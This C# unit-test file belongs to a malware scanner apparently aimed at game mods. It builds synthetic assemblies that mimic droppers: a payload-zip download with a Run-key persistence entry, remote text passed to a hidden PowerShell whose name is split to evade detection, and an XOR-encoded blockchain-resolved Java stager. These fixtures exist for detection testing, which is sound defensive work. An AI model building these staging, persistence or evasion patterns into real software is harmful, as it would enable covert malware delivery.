using FluentAssertions;
using MLVScan.Models;
using MLVScan.Models.Rules;
using Mono.Cecil;
using Mono.Cecil.Cil;
using Xunit;

namespace MLVScan.Core.Tests.Unit.Rules;

public class CoordinatedPayloadDeliveryRuleTests
{
    private readonly CoordinatedPayloadDeliveryRule _rule = new();

    [Fact]
    public void PostAnalysisRefine_ArchiveAutorunHiddenLaunch_ReturnsFinding()
    {
        using var assembly = CreateArchiveInstaller(includeRegistryPersistence: true);
        var existing = new[]
        {
            ProcessFinding("CreateNoWindow=true, WindowStyle=Hidden, Arguments: --hidden")
        };

        var findings = _rule.PostAnalysisRefine(assembly.MainModule, existing).ToList();

        findings.Should().ContainSingle(finding =>
            finding.RuleId == "CoordinatedPayloadDeliveryRule" &&
            finding.Description.Contains("archive payload delivery", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void PostAnalysisRefine_ArchiveUpdaterWithoutPersistence_ReturnsNoFinding()
    {
        using var assembly = CreateArchiveInstaller(includeRegistryPersistence: false);
        var existing = new[]
        {
            ProcessFinding("CreateNoWindow=true, WindowStyle=Hidden, Arguments: --hidden")
        };

        var findings = _rule.PostAnalysisRefine(assembly.MainModule, existing).ToList();

        findings.Should().BeEmpty();
    }

    [Fact]
    public void PostAnalysisRefine_ArchiveInstallerWithVisibleLaunch_ReturnsNoFinding()
    {
        using var assembly = CreateArchiveInstaller(includeRegistryPersistence: true);
        var existing = new[] { ProcessFinding("Target: updater.exe") };

        var findings = _rule.PostAnalysisRefine(assembly.MainModule, existing).ToList();

        findings.Should().BeEmpty();
    }

    [Fact]
    public void PostAnalysisRefine_RemoteTextPassedToHiddenShell_ReturnsFinding()
    {
        using var assembly = CreateRemoteTextShellLauncher();
        var existing = new[]
        {
            ProcessFinding(
                "Target: \"powershell.exe\". Arguments: <dynamic via Replace> " +
                "[Evasion: UseShellExecute set, CreateNoWindow=true]",
                "Test.Sample.RemoteLauncher.Run:42")
        };

        var findings = _rule.PostAnalysisRefine(assembly.MainModule, existing).ToList();

        findings.Should().ContainSingle(finding =>
            finding.RuleId == "CoordinatedPayloadDeliveryRule" &&
            finding.Description.Contains("remote text", StringComparison.OrdinalIgnoreCase) &&
            finding.Description.Contains("shell command", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void PostAnalysisRefine_RemoteVersionCheckAndVisibleShell_ReturnsNoFinding()
    {
        using var assembly = CreateRemoteTextShellLauncher();
        var existing = new[]
        {
            ProcessFinding(
                "Target: \"powershell.exe\". Arguments: -File show-version.ps1",
                "Test.Sample.RemoteLauncher.Run:42")
        };

        var findings = _rule.PostAnalysisRefine(assembly.MainModule, existing).ToList();

        findings.Should().BeEmpty();
    }

    [Fact]
    public void PostAnalysisRefine_FragmentedHiddenShellTarget_ReturnsFinding()
    {
        using var assembly = CreateRemoteTextShellLauncher(fragmentShellTarget: true);
        var existing = new[]
        {
            ProcessFinding(
                "Target: <dynamic via Dup>. Arguments: <unknown/no-arguments> " +
                "[Evasion: UseShellExecute set, CreateNoWindow=true]",
                "Test.Sample.RemoteLauncher.Run:42")
        };

        var findings = _rule.PostAnalysisRefine(assembly.MainModule, existing).ToList();

        findings.Should().ContainSingle(finding =>
            finding.RuleId == "CoordinatedPayloadDeliveryRule" &&
            finding.Description.Contains("remote text", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void PostAnalysisRefine_EncodedEvmJavaPayloadMarkers_ReturnsFinding()
    {
        using var assembly = CreateEncodedEvmJavaStager();
        var existing = new[]
        {
            ProcessFinding("Target: <dynamic>. Arguments: <dynamic> [WindowStyle=Hidden]"),
            EncodedFinding("decoded indicator(s): eth_call, 0x5e280f11, -cp , com.renderassist.Main")
        };

        var findings = _rule.PostAnalysisRefine(assembly.MainModule, existing).ToList();

        findings.Should().ContainSingle(finding =>
            finding.RuleId == "CoordinatedPayloadDeliveryRule" &&
            finding.Description.Contains("blockchain-resolved Java archive stager", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void PostAnalysisRefine_EncodedEvmClientWithoutJavaPayloadMarkers_ReturnsNoFinding()
    {
        using var assembly = CreateEncodedEvmJavaStager();
        var existing = new[]
        {
            ProcessFinding("Target: <dynamic>. Arguments: <dynamic> [WindowStyle=Hidden]"),
            EncodedFinding("decoded indicator(s): eth_call, 0x5e280f11, https://rpc.example.test")
        };

        var findings = _rule.PostAnalysisRefine(assembly.MainModule, existing).ToList();

        findings.Should().BeEmpty();
    }

    private static AssemblyDefinition CreateArchiveInstaller(bool includeRegistryPersistence)
    {
        var assembly = AssemblyDefinition.CreateAssembly(
            new AssemblyNameDefinition("ArchiveInstaller", new Version(1, 0)),
            "ArchiveInstaller",
            ModuleKind.Dll);
        var module = assembly.MainModule;
        var type = new TypeDefinition("Test.Sample", "Installer", TypeAttributes.Public, module.TypeSystem.Object);
        module.Types.Add(type);

        var method = new MethodDefinition("Install", MethodAttributes.Public | MethodAttributes.Static, module.TypeSystem.Void);
        method.Body = new MethodBody(method);
        type.Methods.Add(method);
        var il = method.Body.GetILProcessor();
        il.Emit(OpCodes.Ldstr, "http://198.51.100.8/payload.zip");
        il.Emit(OpCodes.Call, Method(module, "System.Net", "HttpWebRequest", "GetResponse"));
        il.Emit(OpCodes.Call, Method(module, "System.IO", "File", "Create"));
        il.Emit(OpCodes.Call, Method(module, "System.IO.Compression", "ZipFile", "ExtractToDirectory"));
        il.Emit(OpCodes.Call, Method(module, "System", "Environment", "GetFolderPath"));
        if (includeRegistryPersistence)
        {
            il.Emit(OpCodes.Ldstr, @"Software\Microsoft\Windows\CurrentVersion\Run");
            il.Emit(OpCodes.Call, Method(module, "Microsoft.Win32", "RegistryKey", "SetValue"));
        }
        il.Emit(OpCodes.Call, Method(module, "System.Diagnostics", "Process", "Start"));
        il.Emit(OpCodes.Ret);
        return assembly;
    }

    private static AssemblyDefinition CreateRemoteTextShellLauncher(bool fragmentShellTarget = false)
    {
        var assembly = AssemblyDefinition.CreateAssembly(
            new AssemblyNameDefinition("RemoteTextShellLauncher", new Version(1, 0)),
            "RemoteTextShellLauncher",
            ModuleKind.Dll);
        var module = assembly.MainModule;
        var type = new TypeDefinition("Test.Sample", "RemoteLauncher", TypeAttributes.Public, module.TypeSystem.Object);
        module.Types.Add(type);

        var method = new MethodDefinition("Run", MethodAttributes.Public | MethodAttributes.Static, module.TypeSystem.Void);
        method.Body = new MethodBody(method);
        type.Methods.Add(method);
        var il = method.Body.GetILProcessor();
        il.Emit(OpCodes.Ldstr, "https://example.test/profile");
        il.Emit(OpCodes.Call, Method(module, "System.Net.Http", "HttpClient", "GetStringAsync"));
        il.Emit(OpCodes.Call, Method(module, "System.Text.RegularExpressions", "Regex", "Match"));
        if (fragmentShellTarget)
        {
            il.Emit(OpCodes.Ldstr, "powe");
            il.Emit(OpCodes.Ldstr, "rshell.exe");
            il.Emit(OpCodes.Call, Method(module, "System.Diagnostics", "ProcessStartInfo", "set_CreateNoWindow"));
        }
        il.Emit(OpCodes.Call, Method(module, "System.Diagnostics", "ProcessStartInfo", "set_Arguments"));
        il.Emit(OpCodes.Call, Method(module, "System.Diagnostics", "Process", "Start"));
        il.Emit(OpCodes.Ret);
        return assembly;
    }

    private static AssemblyDefinition CreateEncodedEvmJavaStager()
    {
        var assembly = AssemblyDefinition.CreateAssembly(
            new AssemblyNameDefinition("EncodedEvmJavaStager", new Version(1, 0)),
            "EncodedEvmJavaStager",
            ModuleKind.Dll);
        var module = assembly.MainModule;
        var type = new TypeDefinition("Test.Sample", "Stager", TypeAttributes.Public, module.TypeSystem.Object);
        module.Types.Add(type);

        var decode = new MethodDefinition("Decode", MethodAttributes.Public | MethodAttributes.Static, module.TypeSystem.String);
        decode.Body = new MethodBody(decode);
        type.Methods.Add(decode);
        var decodeIl = decode.Body.GetILProcessor();
        decodeIl.Emit(OpCodes.Ldc_I4, 167);
        decodeIl.Emit(OpCodes.Xor);
        decodeIl.Emit(OpCodes.Call, Method(module, "System.Text", "Encoding", "GetString"));
        decodeIl.Emit(OpCodes.Ret);

        var run = new MethodDefinition("Run", MethodAttributes.Public | MethodAttributes.Static, module.TypeSystem.Void);
        run.Body = new MethodBody(run);
        type.Methods.Add(run);
        var runIl = run.Body.GetILProcessor();
        runIl.Emit(OpCodes.Call, Method(module, "System.Net.Http", "HttpClient", "PostAsync"));
        runIl.Emit(OpCodes.Call, Method(module, "System.IO", "File", "WriteAllBytes"));
        runIl.Emit(OpCodes.Call, Method(module, "System.Diagnostics", "Process", "Start"));
        runIl.Emit(OpCodes.Ret);
        return assembly;
    }

    private static MethodReference Method(ModuleDefinition module, string ns, string type, string name)
    {
        return new MethodReference(
            name,
            module.TypeSystem.Void,
            new TypeReference(ns, type, module, module.TypeSystem.CoreLibrary));
    }

    private static ScanFinding ProcessFinding(string description, string location = "Test.Sample.Installer.Install")
    {
        return new ScanFinding(location, description, Severity.High, description)
        {
            RuleId = "ProcessStartRule"
        };
    }

    private static ScanFinding EncodedFinding(string codeSnippet)
    {
        return new ScanFinding(
            "Test.Sample.Stager.Decode",
            "Detected fixed-key byte-array XOR string reconstruction.",
            Severity.High,
            codeSnippet)
        {
            RuleId = "EncodedStringPipelineRule"
        };
    }
}
